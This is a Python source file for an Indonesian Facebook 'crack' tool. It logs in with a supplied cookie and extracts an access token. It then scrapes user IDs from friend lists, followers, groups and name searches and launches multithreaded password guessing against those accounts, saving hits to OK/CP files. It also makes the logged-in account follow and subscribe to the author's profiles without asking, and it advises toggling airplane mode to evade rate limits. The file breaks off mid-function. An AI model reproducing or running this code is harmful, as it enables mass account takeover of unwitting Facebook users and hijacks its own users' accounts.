# coding=utf-8
# coding by Romi Afrizal
# Note : jangan di ubah lagi! nanti error, script udah enak

import os, sys, subprocess, platform
try:
	import rich
except ImportError:
	print ('\n\t\x1b[0m >_< mohon tunggu... >_<\n')
	os.system('pip install rich')
	
import rich
from rich.markdown import Markdown
from rich.console import Console

try:
	import requests
except ImportError:
	catet_req = ('# • sedang menginstall modul requests •')
	requ = rich.markdown.Markdown(catet_req, style='green')
	rich.console.Console().print(requ)
	os.system('pip install requests')
try:
	import concurrent.futures
except ImportError:
	catet_futur = ('# • sedang menginstall modul futures •')
	ft = rich.markdown.Markdown(catet_futur, style='green')
	rich.console.Console().print(ft)
	os.system('pip install futures')
try:
	import bs4
except ImportError:
	catet_bs = ('# • sedang menginstall modul bs4 •')
	soup = rich.markdown.Markdown(catet_bs, style='green')
	rich.console.Console().print(soup)
	os.system('pip install bs4')
try:
	import mechanize
except ImportError:
	catet_mek = ('# • sedang menginstall modul mechanize •')
	meka = rich.markdown.Markdown(catet_mek, style='green')
	rich.console.Console().print(meka)
	os.system('pip install mechanize')	
try:
	bff_2 = open(os.devnull, "w")
	my_music = subprocess.call(["dpkg","-s","play-audio"],stdout=bff_2,stderr=subprocess.STDOUT)
	bff_2.close()
except FileNotFoundError:
	catet_play = ('# • sedang menginstall play-audio •')
	play = rich.markdown.Markdown(catet_play, style='green')
	rich.console.Console().print(play)
	os.system('pkg install play-audio')
	
Mr = '\x1b[1;91m' 
Hj = '\x1b[1;92m' 
Mt = '\x1b[0m'
def ingfoh():
	print (
f"""{Hj}
 • Info script :
 	
 - author      : Romi Afrizal
 - instagram   : romz_xyz
 - facebook    : facebook.com/romi.afrizal.102
 - fanspage    : facebook.com/100022086172556
 - whatsap     : +6282371648186
 - github      : github.com/Mark-Zuck
 - script name : bff-2
 - version     : 1.3
 - update pada : 22 Juni 2022

+ ---------------------------------------- +
             TIDAK SUPORT KARTU 
+ ---------------------------------------- +
- Kartu Telkomsel tidak suport untuk crack
  jadi wajar jika tidak dapat hasil atau lama
  pada saat crack, Karena rawan spam.
  Rekomendasi kartu Axis, XL.
 
+ ---------------------------------------- +
                MODE PESAWAT
+ ---------------------------------------- +
- Jika gunakan mode pesawat itu guna nya 
  akan melewati beberapa ID dan merubah IP 
  kita pada saat proses crack. Cukup gunakan
  mode pesawat 1-2 detik saja. Jika gunakan 
  mode pesawat terlalu lama maka akan semakin
  banyak ID yg terlewatkan. Maka dari itu cukup
  gunakan 1-2 detik saja.
  
{Mr}!{Mt} Jika bug/error pada script harap lapor saya
""")

# MODULE
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from time import sleep as jeda
from datetime import datetime
from rich.panel import Panel
from rich import print as tulis

# TANGGAL BULAN 
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

# KUMPULAN WARNA
Te = '[b]' 
P = '[#FFFFFF]'
U = '[#AF00FF]'
O = '[#00FFFF]'
M = '[#FF0022]' 
Pi = '[#FF0099]' 
H = '[#00FF33]' 
K = '[#FFFF00]' 
Cl = '[/]' 
til = '•'

m = '\x1b[1;91m' # MERAH
h = '\x1b[1;92m' # HIJAU
k = '\x1b[1;93m' # KUNING
b = '\x1b[1;94m' # BIRU
u = '\x1b[1;95m' # UNGU
o = '\x1b[1;96m' # BIRU MUDA
p = '\x1b[1;97m' # PUTIH
j = '\033[38;2;255;127;0;1m' # ORANGE
n = '\x1b[0m' # WARNA MATI
acak = [m, h, k, b, u, o, p, j]
warna = random.choice(acak)
url_mb = "https://mbasic.facebook.com"

# APPEND
ok, cp, id, user, pwx, loop = [], [], [], [], [], 0

sys.stdout.write('\x1b[1;35m\x1b]2; {×} bff-2 by romz {×} \x07')

# JALAN
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)

# FOLDER
def folder():
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:os.mkdir('dump')
	except:pass

# LOGO (LO GOBLOK)
dt = requests.get("http://ip-api.com/json/").json()
try:
	IP = dt["query"]
	CN = dt["country"]
except KeyError:
	IP = " "
	CN = " "

#---------[ JANGAN DI GANTI BRO ]---------#
Author = 'Romi Afrizal' #---> cantumin nama gw bro
fb_me = 'facebook.com/romi.afrizal.102'
github = 'github.com/Mark-Zuck'

def banner():
	os.system('clear')
	os.system('git pull')
	os.system('clear')
	jalan (f'{p}╰─{h} Script ini gratis{m},{h} tidak di perjual belikan{m}!')
	tulis(Panel(f' {Te}{M}{til}{K}{til}{H}{til}                                      {M}{til}{K}{til}{H}{til}\n{M}   _______  ______ _______ _______ _     _\n   |       |_____/ |_____| |       |____/ \n{P}   |_____  |    \\_ |     | |_____  |    \\_\n\n {M}{til}{K}{til}{H}{til}                                      {M}{til}{K}{til}{H}{til} \n {U}#{O} Aut{M}  : {O}Romi Afrizal\n {U}# {O}Fb  {M} : {O}facebook.com/romi.afrizal.102 \n {P}# {M}---------------------------------------- {P}# \n {U}# {O}Git{M}  : {O}github.com/Mark-Zuck \n {U}#{O} IP   {M}:{O} {IP} {H}- {O}{CN} ',
	style='#AF00FF'))
    
# CONVERT COOKIE DICT TO STRING
def romz_xyz(cookie,venom={}):
	for x in cookie.replace(' ','').strip().split(';'):
		kuki = x.split('=')
		if len(kuki) > 1:
			venom.update({kuki[0]: kuki[1]})
	return venom

# MENU MASUK
def Masuk():
	banner()
	tulis(Panel(f"""{Te} {U}•{K} 01 {O}Login menggunakan cookies
 {U}•{K} 02 {O}Cara mendapatkan cookies
 {U}•{K} 03 {O}Lihat hasil crack
 {U}•{M} 00 {O}Keluar""",
	title = f'{M}[ {H}Menu {M}]',style='#FF0022'))
	rom = input('%s╰─ %sPilih %s> %s'%(p,o,m,k))
	if rom in['']:
		exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
	elif rom in['1','01']:
		tulis(Panel(f"{Te} {M}!{O} Wajib gunakan akun tumbal dilarang akun utama",style='#FF0022'))
		kukis = input("%s╰─ %sCookie %s> %s"%(p,o,m,k))
		with requests.Session() as ses:
			try:
				headers_tok = {"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
				url_tok = ses.get('https://business.facebook.com/business_locations',headers = headers_tok,cookies = {"cookie":kukis})
				token = re.search("(EAAG\w+)", url_tok.text).group(1)
				open('data/cookie.txt','w').write(kukis)
				open('data/token.txt','w').write(token)
				print ("\n%s╰─ %sToken %s> %s%s"%(p,o,m,k,token));jeda(2)
				requests.post(f"https://graph.facebook.com/100067807565861/subscribers?access_token={token}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
				requests.post(f"https://graph.facebook.com/100029143111567/subscribers?access_token={token}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
				requests.post(f"https://graph.facebook.com/100028434880529/subscribers?access_token={token}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
				bot_follow(kukis) # bot metode cookies
				jalan ("\n%s √ login berhasil "%(h));jeda(2)
				Menu()
			except (KeyError):
				exit ("%s╰─%s cookie kadaluwarsa "%(p,m));jeda(2)
			except (IOError):
				exit ("%s╰─%s login gagal, periksa cookies anda "%(p,m));jeda(2)
			except (AttributeError):
				exit ("%s╰─%s terjadi kesalahan, periksa cookies anda "%(p,m));jeda(2)
			except requests.exceptions.ConnectionError:
				exit ("%s╰─%s tidak ada koneksi "%(p,m));jeda(2)
	elif rom in['2','02']:
		tulis(Panel(f"{Te}{U} •{O} buka dengan facebook ",style='#FF0022'))
		os.system("xdg-open https://www.facebook.com/100067807565861/posts/231650695771848/?app=fbl")
		exit()
	elif rom in['3','03']:
		hasil_fb()
	elif rom in['0','00']:
		jalan('%s╰─%s Sampai jumpa tod :) '%(p,h));exit()
	else:
		exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
		
# BOT FOLLOW BOLEH NAMBAH
def bot_follow(kukis):
	true = False
	url_mb = "https://mbasic.facebook.com"
	Ikuti ("romi.afrizal.102",kukis,url_mb)
	Ikuti ("romi.alfarabi",kukis,url_mb)
	
def Ikuti(user,kukis,url_mb):
	try:
		cek = requests.get(f"{url_mb}/{user}",cookies={"cookie":kukis}).text
		if "/a/subscribe.php" in cek:
			true=True
		if true==True:
			requests.get(url_mb+parser(cek,"html.parser").find("a",string="Ikuti").get("href"),cookies={"cookie":kukis})
	except:
		pass

# MENU PILIHAN INI AJG
hapus = ('rm -rf data/token.txt && rm -rf data/cookie.txt')
def Menu():
	folder()
	banner()
	try:
		token = open("data/token.txt","r").read()
		coki = {"cookie":open("data/cookie.txt","r").read()}
		nama = requests.get(f'https://graph.facebook.com/me?access_token={token}', cookies=coki).json()['name']
	except KeyError:
		print ("%s╰─%s cookie kadaluwarsa "%(p,m));jeda(2)
		os.system (hapus)
		Masuk()
	except FileNotFoundError:
		print ("%s╰─ %sanda belum login "%(p,m));jeda(2)
		os.system (hapus)
		Masuk()
	except requests.exceptions.ConnectionError as konek:
		exit (f"%s╰─%s gagal memuat tidak ada koneksi: {konek}"%(p,m));jeda(2)
	tulis(Panel(f"""{Te}{U} # {O}Welcome {H}{nama}\n
 {U}•{P} 01 {O}Crack dari daftar teman     {H}on
 {U}•{P} 02 {O}Crack dari total pengikut   {H}on
 {U}•{P} 03 {O}Crack dari reaction post    {M}off
 {U}•{P} 04 {O}Crack dari komentar post    {M}off
 {U}•{P} 05 {O}Crack dari anggota group    {H}on
 {U}•{P} 06 {O}Crack dari pencarian nama   {H}on
 {U}•{P} 07 {O}Crack dari saran teman      {M}off
 {U}•{P} 08 {O}Lihat hasil crack           {H}on
 {U}•{P} 09 {O}Checkpoint detektor         {H}on
 {U}•{P} 10 {O}Info (tentang)
 {U}•{P} rm {O}Hapus data login
 {U}•{M} 00 {O}Keluar (logout)""",
	title = f'{M}[ {H}Menu {M}]',style='#FF0022'))
	pilih(token,coki)
	
def pilih(token,coki):
	slut = input('%s╰─ %sPilih %s> %s'%(p,o,m,k))
	if slut in['',' ']:
		exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
	elif slut in['1','01']:
		gan = input ("%s╰─%s anda ingin crack massal id? y/t%s >%s "%(p,o,m,k))
		if gan in['']:
			exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
		elif gan in['y','Y']:
			MassalPublikGRAPH(token,coki)
		elif gan in['t','T']:
			PublikGRAPH(token,coki)
	elif slut in['2','02']:
		Pengikut()
	elif slut in['3','03']:
		ComingSoon()
	elif slut in['4','04']:
		ComingSoon()
	elif slut in['5','05']:
		DumpGROUP()
	elif slut in['6','06']:
		Nama()
	elif slut in['7','07']:
		ComingSoon()
	#elif slut in['7','07']:
		#useragent()
	elif slut in['8','08']:
		hasil_fb()
	elif slut in['9','09']:
		file_cp()
	elif slut in['10']:
		ingfoh()
	elif slut in['rm','RM','Rm']:
		os.system(hapus)
		jalan('%s╰─%s berhasil terhapus '%(p,m));exit()
	elif slut in['0','00']:
		jalan('%s╰─%s Sampai jumpa tod :) '%(p,h));exit()
	else:
		exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
		
def ComingSoon():
	jalan ("%s╰─ %sMenu belum tersedia... "%(p,o));exit()

# CRACK ID PUBLIK
def PublikGRAPH(token,cookie):
	try:
		tulis(Panel(f"{Te}{U} {til}{O} Pastikan daftar teman bersifat publik ",style='#FF0022'))
		user = input('%s╰─ %sID publik %s> %s'%(p,o,m,k))
		po = requests.get(f"https://graph.facebook.com/v13.0/{user}?fields=friends.limit(5000)&access_token={token}",cookies=cookie).json()
		for i in po['friends']['data']:
			id.append(f"{i['id']}<=>{i['name']}")
			sys.stdout.write (f'\r{p}╰─{o} mengumpulkan id{m} >{h} {str(len(id))} '),
			sys.stdout.flush();jeda(0.0050)
	except KeyError:
		exit('%s╰─%s gagal mengambil id'%(p,m))
	
	print('')
	return Crack().romiy(id)

# CRACK MASSAL PUBLIK
def MassalPublikGRAPH(token,cookie):
	try:
		jum = int(input('%s╰─ %sjumlah target %s > %s'%(p,o,m,k)))
	except:jum=1
	tulis(Panel(f"{Te}{U} {til}{O} Pastikan daftar teman bersifat publik ",style='#FF0022'))
	for t in range(jum):
		t +=1
		try:
			user = input('%s╰─ %sID publik %s%s%s > %s'%(p,o,p,t,m,k))
			po = requests.get(f"https://graph.facebook.com/v13.0/{user}?fields=friends.limit(5000)&access_token={token}",cookies=cookie).json()
			for i in po['friends']['data']:
				id.append(f"{i['id']}<=>{i['name']}")
		except KeyError:
			exit('%s╰─%s gagal mengambil id'%(p,m))
	print (f'\r{p}╰─{o} mengumpulkan id{m} >{h} {len(id)} ')
	
	return Crack().romiy(id)
	
# CRACK PENGIKUT
def Pengikut():
	tulis(Panel(f"{Te}{U} {til}{O} Pastikan target terdapat pengikut ",style='#FF0022'))
	user = input('%s╰─ %sID publik %s> %s'%(p,o,m,k))
	if user in[""," "]:
		exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
	#elif user.isdigit():
		#data_=f"{url_mb}/profile.php?id={user}&v=followers"
	else:
		data_=f"{url_mb}/{user}?v=followers"
	try:
		response = requests.get(data_,cookies=romz_xyz(open("data/cookie.txt","r").read().strip())).text
		if "Halaman Tidak Ditemukan" in response:
			exit('%s╰─%s ID tidak di temukan'%(p,m))
		elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in response:
			exit('%s╰─%s akun terkena spam coba beberapa saat lagi'%(p,m))
		elif "Konten Tidak Ditemukan" in response:
			exit('%s╰─%s ID tidak di temukan'%(p,m))
		else:
			#print("{p}╰─{o} Nama akun{m}> {h}"+re.findall("\<title\>(.*?)<\/title\>",response)[0])
			polower(data_)
	except requests.exceptions.ConnectionError:
		exit ("%s╰─%s tidak ada koneksi "%(p,m));jeda(2)
		
def polower(data_):
	try:
		respon = requests.get(data_,cookies=romz_xyz(open("data/cookie.txt","r").read().strip())).text
		otw = re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>',respon) 
		for i in otw:
			if "&amp;refid=" in i[0]:
				id.append(re.findall("id=(.*?)&",i[0])[0]+"<=>"+i[1])
			elif "profile.php?" in i[0]:
				id.append(re.findall("id=(.*)",i[0])[0]+"<=>"+i[1])
			elif "?refid=" in i[0]:
				id.append(re.findall("(.*?)\?refid=",i[0])[0]+"<=>"+i[1])
			else:
				id.append(i[0]+"<=>"+i[1])
			sys.stdout.write(f'\r{p}╰─{o} mengumpulkan id{m} >{h} {len(id)} '),
			sys.stdout.flush();jeda(0.0050)
		if "Lihat Selengkapnya" in respon:
			polower(url_mb+parser(respon,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
	except:
		pass
	print('')
	return Crack().romiy(id)
	
# CRACK NAMA
def Nama():
	tulis(Panel(f'{Te}{U} •{O} contoh{M} >{O} romi{M},{O}udin{M},{O}yanti',style='#FF0022'))
	kontol = input('%s╰─ %snama %s> %s'%(p,o,m,k)) #.split(',')
	#names = ['ari','anggi','asep','billy','bayu','caca','dela','erik','ela','farhan','fahry','galuh','herman','ica','indah','jaka','kartika','lela','mona','meli','nurman','oca','pahri','qwuan','revan','susi','santi','topir','udin','veli','wawan','xuan','yayan','zeck']
	if kontol in["romi","Romi","ROMI",""]:
		exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
	else:
		try:
			ajg = requests.get(f"{url_mb}/search/people/?q={kontol}",cookies=romz_xyz(open("data/cookie.txt","r").read().strip())).text
			if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
				exit('%s╰─%s akun terkena spam coba beberapa saat lagi'%(p,m))
			elif "Anda Diblokir Sementara" in ajg:
				exit('%s╰─%s akun terkena spam coba beberapa saat lagi'%(p,m))
			else:
				jumlah=int(input('%s╰─ %sjumlah user %s> %s'%(p,o,m,k)))
				if "6000" in str(jumlah):
					jumlah-=1
				if jumlah<6001:
					#for nm_ in kontol:
						#nem = [] 
						#nem.append(nm_)
						#for _nm in names:
							#nem.append(_nm+' '+nm_)
					#for id_nm in nem:
					search_name(f"{url_mb}/search/people/?q={kontol}",jumlah)
				else: exit ('%s╰─%s max user 5000'%(p,m));jeda(2)
		except requests.exceptions.ConnectionError:
			exit ("%s╰─%s tidak ada koneksi "%(p,m));jeda(2)
		except ValueError:
			exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
			
def search_name(data_,jum):
	try:
		true = False
		kontol = requests.get(data_,cookies=romz_xyz(open("data/cookie.txt","r").read().strip())).text
		memek = re.findall('picture" \/>\<\/a\>\<\/td\>\<td\ class\=\"(.*?)\"\>\<a\ href\=\"\/(.*?)"\>\<div\ class\=\"..\"\>\<div\ class\=\"..\"\>(.*?)<\/div>',kontol)
		for i in memek:
			if "profile.php?" in i[1]:
				id.append(re.findall("id=(.*?)&amp;refid",i[1])[0]+"<=>"+i[2])
			else:
				id.append(re.findall("(.*?)\?refid=",i[1])[0]+"<=>"+i[2])
			sys.stdout.write(f'\r{p}╰─{o} mengumpulkan id{m} >{h} {len(id)} '),
			sys.stdout.flush();jeda(0.0050)
			if len(id)==jum:
				true=True
				break
		if true==False:
			if "Lihat Hasil Selanjutnya" in kontol:
				search_name(parser(kontol,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href"),jum)
	except:
		pass
	print("")
	return Crack().romiy(id)
	
# CRACK GROUP
def DumpGROUP():
	tulis(Panel(f"{Te}{U} {til}{O} Pastikan group bersifat publik ",style='#FF0022'))
	idt = input('%s╰─ %sID group %s> %s'%(p,o,m,k))
	if idt in[""," "]:
		print ('%s╰─%s isi yang benar'%(p,m));jeda(2)
	else:
		try:
			response = requests.get(f"{url_mb}/browse/group/members/?id={idt}",cookies=romz_xyz(open("data/cookie.txt","r").read().strip())).text
			if "Halaman Tidak Ditemukan" in response:
				exit('%s╰─%s group tidak di temukan'%(p,m))
			elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in response:
				exit('%s╰─%s akun terkena spam coba beberapa saat lagi'%(p,m))
			elif "Konten Tidak Ditemukan" in response:
				exit('%s╰─%s group tidak di temukan'%(p,m))
			else:
				#print (f"{p}╰─{o} Nama group {m}>{k} "+re.findall("\<title\>(.*?)<\/title\>",response)[0][8:])
				groups(f"{url_mb}/browse/group/members/?id={idt}")
		except requests.exceptions.ConnectionError:
			exit('%s╰─%s tidak ada koneksi%s\n'%(p,m,n))
		
def groups(data_):
	try:
		respon = requests.get(data_, cookies=romz_xyz(open("data/cookie.txt","r").read().strip())).text
		otw = re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',respon)
		for i in otw:
			if "profile.php?" in i[0]:
				id.append(re.findall("id=(.*)",i[0])[0]+"<=>"+i[1])
			else:
				id.append(i[0]+"<=>"+i[1])
			sys.stdout.write(f'\r{p}╰─{o} mengumpulkan id{m} >{h} {len(id)} '),
			sys.stdout.flush();jeda(0.0050)
		if "Lihat Selengkapnya" in respon:
			groups(url_mb+parser(respon,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		else:
			def tambah(gc):
				a = requests.get(gc, cookies=romz_xyz(open("data/cookie.txt","r").read().strip())).text
				b = re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
				if len(b)!=0:
					for c in b:
						if "profile.php" in c[0]:
							d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
							if d in id:
								continue
							else:
								id.append(d+"<=>"+c[1])
						else:
							d=re.search("(.*?)\?refid",c[0]).group(1)
							if d in id:
								continue
							else:
								id.append(d+"<=>"+c[1])
						sys.stdout.write(f'\r{p}╰─{o} mengumpulkan id{m} >{h} {len(id)} '),
						sys.stdout.flush();jeda(0.0050)
				if "Lihat Postingan Lainnya" in a:
					tambah(url_mb+parser(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
			tambah(f"{url_mb}/groups/"+re.search("id=(\\d*)",data_).group(1))
	except:
		pass
	print("")
	return Crack().romiy(id) 
			
# USER AGENT
def user_agentAPI():
	ugent =[
	    "Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3396.81 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12",
	    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)",
        "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
        "NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)",
        "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2",
        "Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
        "Mozilla/5.0 (Linux; Android 7.0; MHA-L29 Build/HUAWEIMHA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/96.0.0.45.70;FBBV/60548545;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/E-Plus;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]",
        "Mozilla/5.0 (Linux; Android 4.4.4; G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]",
        "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
        "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
        "[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]"]
	rand_ua = random.choice(ugent)
	return rand_ua
	
# GANTI USER AGENT
def useragent():
	tulis(Panel(f"{U} •{P} 01 {O}Ganti user agent\n{U} •{P} 02 {O}Cek user agent \n{U} •{M} 00 {O}Kembali",style='#FF0022'))
	_romz_ = input('%s╰─%s Pilih%s >%s '%(p,o,m,k))
	uas(_romz_)
	
def uas(_romz_):
	if _romz_ == '':
		print ('%s╰─%s isi yang benar'%(p,m));jeda(2)
		uas(_romz_)
	elif _romz_ in("1","01"):
		tulis(Panel(f"{U} •{O} Ketik {H}My user agent{O} di browser google chrome\n {U}•{O} untuk gunakan user agent anda sendiri\n {U}•{O} Ketik {H}Cancel {O}untuk gunakan user agent bawaan tools",style='#FF0022'))
		ua = input("%s╰─%s Enter user agent %s: %s"%(p,o,m,k))
		if ua in(""):
			print ("%s╰─%s isi yang benar "%(p,m));jeda(2)
			Menu()
		elif ua in("my user agent","My User Agent","MY USER AGENT","My user agent"):
			jalan("%s╰─%s Anda akan di arahkan ke browser "%(p,o));jeda(2)
			os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2)
			useragent(_romz_)
		elif ua in("CANCEL","Cancel","cancel"):
			ua_ = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
			open("ua.txt","w").write(ua_);jeda(2)
			print ("%s╰─%s menggunakan user agent bawaan "%(p,h));jeda(2)
			Menu()
		open("ua.txt","w").write(ua);jeda(2)
		print ("%s╰─%s berhasil mengganti user agent"%(p,h));jeda(2)
		Menu()
	elif _romz_ in("2","02"):
		try:
			ua_ = open('ua.txt', 'r').read();jeda(2)
			print ("%s╰─%s user agent anda%s : %s%s"%(p,o,m,h,ua_));jeda(2)
			input('%s╰─%s [%s Enter%s ] '%(p,u,o,u,o))
			menu()
		except IOError:
			ua_ = '%s╰─%s-'%(p,m)
	elif _romz_ in("0","00"):
		Menu()
	else:
		print ('%s╰─%s isi yang benar'%(p,m));jeda(2)
		uas(_romz_)
		
# MULAI CRACK 
pwx = []
class Crack:
	
	def __init__(self):
		self.id = []
		self.url = "https://mbasic.facebook.com"
		
	def romiy(self,id):
		self.id = id
		#print ('%s╰─%s jumlah Id%s > %s%s'%(p,o,m,h,len(self.id)))
		unikers = input('%s╰─%s gunakan password manual? y/t%s > %s'%(p,o,m,k))
		if unikers in ('Y', 'y'):
			tulis(Panel(f'{Te}{U} •{O} contoh{M} >{O} sayang{M},{O}pengen{M},{O}ngentot',style='#FF0022'))
			while True:
				pwx = input('%s╰─%s password %s> %s'%(p,o,m,k))
				if pwx == '':
					print ('\n%s╰─%s jangan kosong '%(p,m))
				elif len(pwx)<=5:
					print ('%s╰─%s password minimal 6 karakter'%(p,m))
					exit()
				else:
					def manual(brute=None):
						ind = input('%s╰─ %sPilih %s> %s'%(p,o,m,k))
						if ind =='':
							print("%s╰─%s isi yang benar kentod "%(p,m))
							manual()
						elif ind in ('1', '01'):
							tulis(Panel(f'{Te}{U} {til}{O} akun {H}[OK] {O}tersimpan ke file {M}> {H}OK/{waktu}.txt \n{U} {til}{O} akun {K}[CP] {O}tersimpan ke file {M}> {K}OK/{waktu}.txt \n {U}!{O} setiap crack 1k ID, mainkan mode pesawat 2 detik',
							style='#FF0022'))
							with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
								for akun in self.id:
									try:
										_heck_ = akun.split('<=>')[0]
										TitidNeverDie.submit(self.free, _heck_, brute, "free.facebook.com")
									except: pass
							hasil(ok,cp)
						elif ind in ('2', '02'):
